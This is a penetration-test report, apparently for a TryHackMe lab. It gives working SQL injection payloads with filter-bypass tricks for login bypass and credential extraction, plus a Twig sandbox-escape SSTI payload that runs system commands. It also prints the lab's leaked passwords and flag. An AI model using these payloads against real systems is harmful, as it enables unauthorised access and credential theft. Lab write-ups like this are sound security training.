Penetration Test Disclosure Report

TryHackMe Medium · May 31, 2026

Client: Injectics Corp Assessment Date: May 31, 2026 Classification: CONFIDENTIAL

1. Executive Summary

A penetration test was conducted against the target environment at 10.67.189.74. The assessment identified four security vulnerabilities that, when chained, allowed an unauthenticated attacker to achieve full remote compromise of the host. Initial access was gained via SQL injection authentication bypass, followed by a second SQL injection that leaked database credentials. Admin panel access revealed a Server-Side Template Injection (SSTI) vulnerability that yielded remote code execution as www-data, exposing sensitive flag files in the web root.

4. Detailed Findings

F-01: SQL Injection in Login Form (Authentication Bypass)

Severity: Critical (CVSSv3: 9.8) Affected Component: /functions.php — POST username parameter

Description: The login handler at functions.php concatenates unsanitized user input directly into a SQL query. A server-side filter blocks the keywords or, and, union, select, ', and ", but does not block the || (concatenation/OR) operator, allowing authentication bypass.

Steps to Reproduce:

POST /functions.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin' || 1=1 LIMIT 1 OFFSET 1 -- -&password=test&function=login

Impact: Unauthenticated remote attacker gains authenticated access as any user in the database.

Recommendation: Use parameterized queries (prepared statements) instead of string concatenation. Input validation should reject dangerous characters rather than selectively filtering keywords.

F-02: SQL Injection in Leaderboard Edit (Data Exfiltration)

Severity: High (CVSSv3: 8.6) Affected Component: /edit_leaderboard.php — POST gold parameter

Description: The leaderboard edit functionality directly concatenates user input into an UPDATE SQL statement. A server-side filter strips the keywords SELECT, OR, and AND via a single-pass replacement, which can be bypassed by nesting the keywords (e.g., SESELECTLECT → SELECT, infoORrmation_schema → information_schema, passwoORrd → password). The COUNTRY column can be set to the result of a subquery, allowing data extraction.

Steps to Reproduce:

Extract database credentials:

POST /edit_leaderboard.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

rank=1&country=USA&gold=1,country=(SESELECTLECT group_concat(email,':',passwoORrd) from bac_test.users)&silver=21&bronze=0

Response from /dashboard.php shows:

<th scope='row'>1</th>
<td>dev@injectics.thm:2342sdsfwf2wr2rf,superadmin@injectics.thm:34234vsdfwr2r2wf2r2</td>

Impact: An authenticated attacker can extract all data from the database, including user passwords. The database user is root@localhost with full privileges including FILE.

Recommendation: Use parameterized queries (prepared statements). Apply least-privilege to the MySQL database user.

F-03: Server-Side Template Injection (SSTI) in Profile Update

Severity: Critical (CVSSv3: 9.8) Affected Component: /update_profile.php — POST fname / lname parameters

Description: The profile update page stores first and last name values that are rendered on the dashboard through the Twig templating engine without sanitization. User-supplied values containing Twig template syntax ({{ }}) are evaluated server-side. The Twig sandbox is enabled but can be bypassed using the sort filter with a PHP function name as a callback when the input array contains at least two elements.

Steps to Reproduce:

POST /update_profile.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=superadmin@injectics.thm&fname={{['id','']|sort('passthru')}}&lname=

Response from /dashboard.php:

Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data)!

Impact: Remote code execution as www-data user. Attacker can execute arbitrary system commands, read sensitive files, and pivot within the environment.

Recommendation: Never render user-supplied input through a template engine. Sanitize or escape all user-controlled values displayed on web pages.

F-04: Sensitive Flag Files Exposed in Web Root

Severity: High (CVSSv3: 7.5) Affected Component: /var/www/html/flags/

Description: Sensitive flag files containing confidential information are stored in a web-accessible directory. While directory listing returns 403 Forbidden, the files remain readable by any authenticated user with RCE access.

Evidence:

$ ls -la /var/www/html/flags/
total 12
drwxrwxr-x 2 ubuntu ubuntu 4096 Jul 18 14:58 .
drwxr-xr-x 4 ubuntu ubuntu 4096 Jul 18 15:27 ..
-rw-rw-r-- 1 ubuntu ubuntu   38 Jul 18 14:58 5d[REDACTED]48.txt

Impact: Confidential flag data was retrieved (THM{5735172b6c147f4dd649872f73e0fdea}).

Recommendation: Store sensitive files outside the web root. If they must be in the web root, implement proper access controls (e.g., .htaccess, authentication middleware).
